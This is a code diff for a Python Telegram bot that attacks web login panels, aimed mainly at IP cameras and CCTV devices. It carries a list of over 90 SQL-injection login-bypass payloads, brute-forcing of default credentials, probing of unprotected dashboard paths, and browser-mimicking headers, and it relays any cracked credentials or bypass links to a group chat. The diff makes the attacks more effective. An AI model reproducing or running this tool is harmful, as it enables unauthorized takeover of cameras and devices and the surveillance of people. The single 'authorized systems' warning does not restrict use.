@@ -8,9 +8,10 @@ from typing import Tuple, Optional, Dict
 from urllib.parse import urljoin
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
-from aiohttp import ClientSession, ClientTimeout
-from aiohttp.web import Application as WebApp, Response, run_app
+from aiohttp import ClientSession, ClientTimeout, ClientError
 from bs4 import BeautifulSoup
+# from selenium import webdriver
+# from selenium.webdriver.chrome.options import Options
 
 # Setup logging
 logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
@@ -79,6 +80,9 @@ DIRECT_PATHS = [
     "/ipcamera", "/ipcamera/login", "/ipcamera/dashboard", "/ipcamera/config", "/ipcamera/settings"
 ]
 
+# Common login paths to check
+LOGIN_PATHS = ["/login", "/admin", "/login.php", "/admin/login", "/web", "/auth", "/signin", "/default.html"]
+
 # Credentials for brute force
 USERNAMES = ["admin", "root", "user", "guest", "administrator"]
 PASSWORDS = [
@@ -86,7 +90,7 @@ PASSWORDS = [
     "1234", "adminadmin", "root", "toor", "pass", "test", "qwerty", "letmein"
 ]
 
-# SQL injection payloads (advanced, 80+)
+# SQL injection payloads (advanced, 90+)
 SQL_PAYLOADS = [
     # Basic bypass
     "' OR '1'='1", "admin' --", "admin' #", "' OR ''='", "admin' OR '1'='1",
@@ -102,6 +106,7 @@ SQL_PAYLOADS = [
     "' OR BENCHMARK(2000000,MD5(1))--", "admin' OR SLEEP(3) AND '1'='1--",
     "' OR 1=1 AND SLEEP(3) LIMIT 1--", "' OR IF((SELECT 1)=1,SLEEP(3),0)--",
     "' OR 1=1 AND IF(1=1,SLEEP(3),0)--", "' OR SLEEP(3) AND '1'='1'--",
+    "' OR SLEEP(4)--", "' OR IF(1=1,SLEEP(4),0)--", "admin' AND SLEEP(4)--",
     # Union-based
     "' UNION SELECT NULL, NULL--", "' UNION SELECT 1, 2--",
     "' UNION SELECT username, password FROM users--",
@@ -111,6 +116,7 @@ SQL_PAYLOADS = [
     "' UNION SELECT 1, table_name FROM information_schema.tables--",
     "' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name='users'--",
     "admin' UNION SELECT NULL, concat(username, ':', password) FROM users--",
+    "' UNION SELECT NULL, NULL, NULL--", "' UNION SELECT 1, 2, 3--",
     # Error-based
     "' OR 1=1 AND (SELECT 1 FROM users WHERE 1=1)--",
     "admin' AND (SELECT password FROM users WHERE username='admin')--",
@@ -118,6 +124,7 @@ SQL_PAYLOADS = [
     "' OR 1=1 AND (SELECT 1/0 FROM dual)--",
     "' OR 1=1 AND UPDATEXML(1,CONCAT(0x7e,(SELECT user())),1)--",
     "' OR 1=1 AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
+    "' OR 1=1 AND FLOOR(RAND(0)*2)--",
     # Stacked queries
     "'; SELECT 1--", "'; SELECT SLEEP(3)--", "admin'; SELECT username FROM users--",
     "'; INSERT INTO users (username, password) VALUES ('test', 'test')--",
@@ -126,8 +133,17 @@ SQL_PAYLOADS = [
     "' OR '1'='1' AND user='admin'--", "admin' OR user='admin'--",
     "' OR '1'='1' AND username='admin'--", "admin' OR username='admin'--",
     "' OR '1'='1' AND login='admin'--", "admin' OR login='admin'--",
-    "admin' AND 1=1--", "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--"
+    "admin' AND 1=1--", "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
+    "' OR '1'='1' AND user_id='admin'--", "admin' OR user_id='admin'--"
 ]
+
+# Custom headers to mimic browser
+HEADERS = {
+    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
+    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
+    "Accept-Language": "en-US,en;q=0.5",
+    "Referer": "http://example.com"
+}
 
 async def check_access(user_id: str) -> bool:
     if user_id == ADMIN_ID:
@@ -240,72 +256,131 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
             pass
     await update.message.reply_text("Operation cancelled.")
 
-async def get_form_fields(url: str, session: ClientSession) -> Tuple[Optional[str], Optional[str], Dict, Optional[str]]:
+async def get_form_fields(url: str, session: ClientSession) -> Tuple[Optional[str], Optional[str], Dict, Optional[str], Optional[str]]:
     try:
-        async with session.get(url, ssl=False, timeout=5) as response:
+        async with session.get(url, headers=HEADERS, ssl=False, timeout=10) as response:
             html = await response.text()
             soup = BeautifulSoup(html, "html.parser")
             
             # Extract company name
             company = "Unknown"
             title = soup.title.string if soup.title else ""
-            meta = soup.find("meta", {"name": ["description", "author", "generator"]})
+            meta = soup.find("meta", {"name": ["description", "author", "generator", "keywords"]})
             meta_content = meta.get("content", "") if meta else ""
-            for source in [title, meta_content, html]:
-                for brand in ["Hikvision", "Dahua", "Axis", "Bosch", "Vivotek", "Generic CCTV"]:
+            scripts = soup.find_all("script")
+            script_content = " ".join(script.get_text() for script in scripts)
+            for source in [title, meta_content, html, script_content]:
+                for brand in ["Hikvision", "Dahua", "Axis", "Bosch", "Vivotek", "Generic CCTV", "ZKTeco", "Reolink"]:
                     if brand.lower() in source.lower():
                         company = brand
                         break
                 if company != "Unknown":
                     break
             
-            # Find form
+            # Find form (including iframes)
             form = soup.find("form")
             if not form:
-                logger.error("No form found in page")
-                return None, None, {}, company
+                iframes = soup.find_all("iframe")
+                for iframe in iframes:
+                    iframe_url = urljoin(url, iframe.get("src", ""))
+                    async with session.get(iframe_url, headers=HEADERS, ssl=False, timeout=10) as iframe_response:
+                        iframe_html = await iframe_response.text()
+                        iframe_soup = BeautifulSoup(iframe_html, "html.parser")
+                        form = iframe_soup.find("form")
+                        if form:
+                            html = iframe_html
+                            soup = iframe_soup
+                            break
             
-            # Extract all inputs
+            if not form:
+                logger.error(f"No form found at {url}")
+                return None, None, {}, company, url
+            
+            # Extract inputs
             inputs = form.find_all("input")
             form_data = {inp.get("name"): inp.get("value", "") for inp in inputs if inp.get("name")}
             username_field = next((name for name in form_data if name.lower() in [
-                "username", "user", "login", "email", "name", "loginid", "userid", "user_id"
+                "username", "user", "login", "email", "name", "loginid", "userid", "user_id", "uname", "userName"
             ]), None)
             password_field = next((name for name in form_data if name.lower() in [
-                "password", "pass", "pwd", "passwd", "passcode"
+                "password", "pass", "pwd", "passwd", "passcode", "passWord"
             ]), None)
             
-            return username_field, password_field, form_data, company
+            return username_field, password_field, form_data, company, url
+    except ClientError as e:
+        logger.error(f"Network error accessing {url}: {e}")
+        return None, None, {}, "Unknown", url
     except Exception as e:
-        logger.error(f"Error parsing form: {e}")
-        return None, None, {}, "Unknown"
+        logger.error(f"Error parsing form at {url}: {e}")
+        return None, None, {}, "Unknown", url
+
+# Selenium fallback (uncomment for local testing or paid Koyeb)
+# async def get_form_fields_selenium(url: str) -> Tuple[Optional[str], Optional[str], Dict, Optional[str], Optional[str]]:
+#     try:
+#         options = Options()
+#         options.add_argument("--headless")
+#         options.add_argument("--no-sandbox")
+#         options.add_argument("--disable-dev-shm-usage")
+#         driver = webdriver.Chrome(options=options)
+#         driver.get(url)
+#         await asyncio.sleep(3)  # Wait for JS to render
+#         html = driver.page_source
+#         driver.quit()
+#         
+#         soup = BeautifulSoup(html, "html.parser")
+#         company = "Unknown"
+#         title = soup.title.string if soup.title else ""
+#         meta = soup.find("meta", {"name": ["description", "author", "generator", "keywords"]})
+#         meta_content = meta.get("content", "") if meta else ""
+#         scripts = soup.find_all("script")
+#         script_content = " ".join(script.get_text() for script in scripts)
+#         for source in [title, meta_content, html, script_content]:
+#             for brand in ["Hikvision", "Dahua", "Axis", "Bosch", "Vivotek", "Generic CCTV", "ZKTeco", "Reolink"]:
+#                 if brand.lower() in source.lower():
+#                     company = brand
+#                     break
+#             if company != "Unknown":
+#                 break
+#         
+#         form = soup.find("form")
+#         if not form:
+#             logger.error(f"No form found at {url} (Selenium)")
+#             return None, None, {}, company, url
+#         
+#         inputs = form.find_all("input")
+#         form_data = {inp.get("name"): inp.get("value", "") for inp in inputs if inp.get("name")}
+#         username_field = next((name for name in form_data if name.lower() in [
+#             "username", "user", "login", "email", "name", "loginid", "userid", "user_id", "uname", "userName"
+#         ]), None)
+#         password_field = next((name for name in form_data if name.lower() in [
+#             "password", "pass", "pwd", "passwd", "passcode", "passWord"
+#         ]), None)
+#         
+#         return username_field, password_field, form_data, company, url
+#     except Exception as e:
+#         logger.error(f"Selenium error at {url}: {e}")
+#         return None, None, {}, "Unknown", url
 
 async def check_success(response, html: str, session: ClientSession) -> bool:
     try:
         if response.status in [200, 302]:
             soup = BeautifulSoup(html, "html.parser")
-            # Check for no login form
             if not soup.find("form") or not re.search(r'login|sign in|invalid|error|unauthorized', html, re.IGNORECASE):
                 return True
-            # Check for dashboard keywords
-            if re.search(r'dashboard|welcome|control panel|admin|settings|manage|overview', html, re.IGNORECASE):
+            if re.search(r'dashboard|welcome|control panel|admin|settings|manage|overview|main', html, re.IGNORECASE):
                 return True
-            # Check redirect to protected path
             if response.url.path in ["/dashboard", "/admin", "/home", "/panel", "/settings", "/manage", "/control", "/main"]:
                 return True
-            # Check for session cookies
-            if any(cookie in response.cookies for cookie in ["session", "auth", "PHPSESSID", "JSESSIONID"]):
+            if any(cookie in response.cookies for cookie in ["session", "auth", "PHPSESSID", "JSESSIONID", "token"]):
                 return True
-            # Check JSON response
             if response.content_type == "application/json":
                 json_data = await response.json()
                 if any(key in json_data for key in ["success", "authenticated", "status"]) and json_data.get(key, False):
                     return True
-            # Follow redirect
             if response.status == 302 and response.headers.get("Location"):
-                async with session.get(response.headers["Location"], ssl=False, timeout=5) as redirect_response:
+                async with session.get(response.headers["Location"], headers=HEADERS, ssl=False, timeout=10) as redirect_response:
                     redirect_html = await redirect_response.text()
-                    if re.search(r'dashboard|admin|settings|manage|overview', redirect_html, re.IGNORECASE):
+                    if re.search(r'dashboard|admin|settings|manage|overview|main', redirect_html, re.IGNORECASE):
                         return True
     except Exception as e:
         logger.error(f"Error checking success: {e}")
@@ -313,78 +388,94 @@ async def check_success(response, html: str, session: ClientSession) -> bool:
 
 async def sql_injection(url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE) -> list:
     results = []
-    username_field, password_field, form_data, company = await get_form_fields(url, session)
     
-    # Report detection status
-    if not username_field or not password_field:
-        detection_message = f"❌ No login form detected at {url}. Company: {company}"
+    # Try provided URL and common login paths
+    urls_to_check = [url] + [urljoin(url, path) for path in LOGIN_PATHS]
+    for check_url in urls_to_check:
+        username_field, password_field, form_data, company, final_url = await get_form_fields(check_url, session)
+        
+        # Report detection status
+        if not username_field or not password_field:
+            detection_message = f"❌ No login form detected at {check_url}. Company: {company}"
+            await update.message.reply_text(detection_message)
+            if GROUP_CHAT_ID:
+                await context.bot.send_message(GROUP_CHAT_ID, detection_message)
+            continue
+        
+        detection_message = f"✅ Login panel detected at {check_url}. Company: {company}"
         await update.message.reply_text(detection_message)
         if GROUP_CHAT_ID:
             await context.bot.send_message(GROUP_CHAT_ID, detection_message)
-        return [detection_message]
-    
-    detection_message = f"✅ Login panel detected at {url}. Company: {company}"
-    await update.message.reply_text(detection_message)
-    if GROUP_CHAT_ID:
-        await context.bot.send_message(GROUP_CHAT_ID, detection_message)
-    
-    # Start SQL injection
-    total_payloads = len(SQL_PAYLOADS)
-    progress_message = await update.message.reply_text(
-        f"🔄 Starting SQL Injection on {url}\nProgress: 0/{total_payloads} payloads",
-        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
-    )
-    context.user_data["progress_message_id"] = progress_message.message_id
-
-    for i, payload in enumerate(SQL_PAYLOADS, 1):
-        try:
-            data = form_data.copy()
-            data[username_field] = payload
-            data[password_field] = "test"
-            async with session.post(url, data=data, ssl=False, timeout=5, allow_redirects=True) as response:
-                html = await response.text()
-                if await check_success(response, html, session):
-                    direct_url = response.url if response.url.path != "/login" else f"{url.replace('/login', '')}/dashboard"
-                    results.append(f"✅ Bypassed! Payload: {payload}\n[🌐 Visit {direct_url}]")
-                    logger.info(f"SQL bypass success: {payload}")
-                    break
-                # Check for credentials in response
-                cred_match = re.search(r'username:.*?(\w+).*?password:.*?(\w+)', html, re.IGNORECASE)
-                if cred_match:
-                    results.append(f"✅ Credentials Found: Username: {cred_match.group(1)}, Password: {cred_match.group(2)}")
-                await asyncio.sleep(0.6)  # Stricter rate limiting
-            if i % 5 == 0 or i == total_payloads:
-                try:
-                    await context.bot.edit_message_text(
-                        chat_id=update.effective_chat.id,
-                        message_id=progress_message.message_id,
-                        text=f"🔄 SQL Injection on {url}\nProgress: {i}/{total_payloads} payloads",
-                        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
-                    )
-                except Exception as e:
-                    logger.error(f"Error updating progress: {e}")
-        except Exception as e:
-            logger.error(f"SQL injection error on payload {payload}: {e}")
-            continue
-    
-    # Fallback to brute force if SQL fails
-    if not results:
-        await context.bot.edit_message_text(
-            chat_id=update.effective_chat.id,
-            message_id=progress_message.message_id,
-            text=f"🔄 SQL Injection failed. Trying Brute Force on {url}\nProgress: 0/{len(USERNAMES) * len(PASSWORDS)} combinations",
+        
+        # Start SQL injection
+        total_payloads = len(SQL_PAYLOADS)
+        progress_message = await update.message.reply_text(
+            f"🔄 Starting SQL Injection on {check_url}\nProgress: 0/{total_payloads} payloads",
             reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
         )
-        results = await brute_force(url, session, update, context, form_data, username_field, password_field)
+        context.user_data["progress_message_id"] = progress_message.message_id
+
+        for i, payload in enumerate(SQL_PAYLOADS, 1):
+            try:
+                # Try payload in both username and password fields
+                for field in [username_field, password_field]:
+                    data = form_data.copy()
+                    data[field] = payload
+                    if field != password_field:
+                        data[password_field] = "test"
+                    if field != username_field:
+                        data[username_field] = "admin"
+                    async with session.post(check_url, data=data, headers=HEADERS, ssl=False, timeout=10, allow_redirects=True) as response:
+                        html = await response.text()
+                        if await check_success(response, html, session):
+                            direct_url = response.url if response.url.path != "/login" else f"{check_url.replace('/login', '')}/dashboard"
+                            results.append(f"✅ Bypassed! Payload: {payload} (Field: {field})\n[🌐 Visit {direct_url}]")
+                            logger.info(f"SQL bypass success: {payload} at {check_url}")
+                            return results
+                        cred_match = re.search(r'username:.*?(\w+).*?password:.*?(\w+)', html, re.IGNORECASE)
+                        if cred_match:
+                            results.append(f"✅ Credentials Found: Username: {cred_match.group(1)}, Password: {cred_match.group(2)}")
+                    await asyncio.sleep(0.6)
+                if i % 5 == 0 or i == total_payloads:
+                    try:
+                        await context.bot.edit_message_text(
+                            chat_id=update.effective_chat.id,
+                            message_id=progress_message.message_id,
+                            text=f"🔄 SQL Injection on {check_url}\nProgress: {i}/{total_payloads} payloads",
+                            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
+                        )
+                    except Exception as e:
+                        logger.error(f"Error updating progress: {e}")
+            except ClientError as e:
+                logger.error(f"Network error on payload {payload} at {check_url}: {e}")
+                continue
+            except Exception as e:
+                logger.error(f"SQL injection error on payload {payload} at {check_url}: {e}")
+                continue
+        
+        # Fallback to brute force
+        if not results:
+            await context.bot.edit_message_text(
+                chat_id=update.effective_chat.id,
+                message_id=progress_message.message_id,
+                text=f"🔄 SQL Injection failed. Trying Brute Force on {check_url}\nProgress: 0/{len(USERNAMES) * len(PASSWORDS)} combinations",
+                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="cancel_sql")]])
+            )
+            results = await brute_force(check_url, session, update, context, form_data, username_field, password_field)
+            if results and "Cracked" in results[0]:
+                return results
+        
+        # Clean up progress message
+        try:
+            await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=progress_message.message_id)
+        except:
+            pass
+        context.user_data.pop("progress_message_id", None)
+        
+        if results:
+            return results
     
-    # Clean up progress message
-    try:
-        await context.bot.delete_message(chat_id=update.effective_chat.id, message_id=progress_message.message_id)
-    except:
-        pass
-    context.user_data.pop("progress_message_id", None)
-    
-    return results or ["❌ No bypass found. Try a different URL or check form fields."]
+    return ["❌ No login form detected in provided URL or common login paths. Try a different URL or check HTML."]
 
 async def brute_force(url: str, session: ClientSession, update: Update, context: ContextTypes.DEFAULT_TYPE, form_data: Dict, username_field: str, password_field: str) -> list:
     results = []
@@ -397,12 +488,12 @@ async def brute_force(url: str, session: ClientSession, update: Update, context:
                 data = form_data.copy()
                 data[username_field] = username
                 data[password_field] = password
-                async with session.post(url, data=data, ssl=False, timeout=5, allow_redirects=True) as response:
+                async with session.post(url, data=data, headers=HEADERS, ssl=False, timeout=10, allow_redirects=True) as response:
                     html = await response.text()
                     if await check_success(response, html, session):
                         direct_url = f"{url.replace('/login', '')}/dashboard"
                         results.append(f"✅ Cracked! Username: {username}, Password: {password}\n[🌐 Visit {direct_url}]")
-                        logger.info(f"Brute force success: {username}:{password}")
+                        logger.info(f"Brute force success: {username}:{password} at {url}")
                         return results
                     await asyncio.sleep(0.6)
                 if count % 5 == 0 or count == total_combinations:
@@ -415,8 +506,11 @@ async def brute_force(url: str, session: ClientSession, update: Update, context:
                         )
                     except Exception as e:
                         logger.error(f"Error updating progress: {e}")
+            except ClientError as e:
+                logger.error(f"Network error in brute force at {url}: {e}")
+                continue
             except Exception as e:
-                logger.error(f"Brute force error: {e}")
+                logger.error(f"Brute force error at {url}: {e}")
                 continue
     return results or ["❌ No credentials found via brute force."]
 
@@ -432,7 +526,7 @@ async def direct_check(base_url: str, session: ClientSession, update: Update, co
     for i, path in enumerate(DIRECT_PATHS, 1):
         try:
             full_url = urljoin(base_url, path)
-            async with session.get(full_url, ssl=False, timeout=5, allow_redirects=True) as response:
+            async with session.get(full_url, headers=HEADERS, ssl=False, timeout=10, allow_redirects=True) as response:
                 html = await response.text()
                 if response.status == 200 and not re.search(r'<form.*?(login|username|password).*?>', html, re.IGNORECASE):
                     if re.search(r'dashboard|admin|control panel|settings|manage', html, re.IGNORECASE):
@@ -449,8 +543,11 @@ async def direct_check(base_url: str, session: ClientSession, update: Update, co
                     )
                 except Exception as e:
                     logger.error(f"Error updating progress: {e}")
+        except ClientError as e:
+            logger.error(f"Network error in direct check at {full_url}: {e}")
+            continue
         except Exception as e:
-            logger.error(f"Direct check error: {e}")
+            logger.error(f"Direct check error at {full_url}: {e}")
             continue
     
     try:
@@ -485,16 +582,20 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Invalid URL. Please include http:// or https://")
         return
     await update.message.reply_text(f"⚠️ Starting {mode.replace('_', ' ')} on {url}...\nUse only on authorized systems!")
-    async with ClientSession(timeout=ClientTimeout(total=5)) as session:
+    async with ClientSession(timeout=ClientTimeout(total=10)) as session:
         try:
             if mode == "sql_injection":
                 results = await sql_injection(url, session, update, context)
             elif mode == "brute_force":
-                username_field, password_field, form_data, company = await get_form_fields(url, session)
+                username_field, password_field, form_data, company, final_url = await get_form_fields(url, session)
                 if not username_field or not password_field:
-                    results = [f"❌ No login form detected at {url}. Company: {company}"]
+                    results = [f"❌ No login form detected at {final_url}. Company: {company}"]
                 else:
-                    results = await brute_force(url, session, update, context, form_data, username_field, password_field)
+                    detection_message = f"✅ Login panel detected at {final_url}. Company: {company}"
+                    await update.message.reply_text(detection_message)
+                    if GROUP_CHAT_ID:
+                        await context.bot.send_message(GROUP_CHAT_ID, detection_message)
+                    results = await brute_force(final_url, session, update, context, form_data, username_field, password_field)
             else:  # direct_check
                 results = await direct_check(url, session, update, context)
             result_text = "\n".join(results)
@@ -502,7 +603,7 @@ async def handle_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
             if GROUP_CHAT_ID:
                 await context.bot.send_message(GROUP_CHAT_ID, f"📊 {mode.replace('_', ' ')} Results for {url}:\n{result_text}")
         except Exception as e:
-            logger.error(f"Error in {mode}: {e}")
+            logger.error(f"Error in {mode} at {url}: {e}")
             await update.message.reply_text(f"Error: {str(e)}")
 
 async def handle_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -536,12 +637,10 @@ def run_health_server():
         logger.error(f"Health server error: {e}")
 
 def main():
-    # Start health check server in a separate thread
     health_thread = threading.Thread(target=run_health_server, daemon=True)
     health_thread.start()
     logger.info("Health check server thread started")
 
-    # Start Telegram bot
     try:
         app = Application.builder().token(TELEGRAM_TOKEN).build()
         app.add_handler(CommandHandler("start", start))
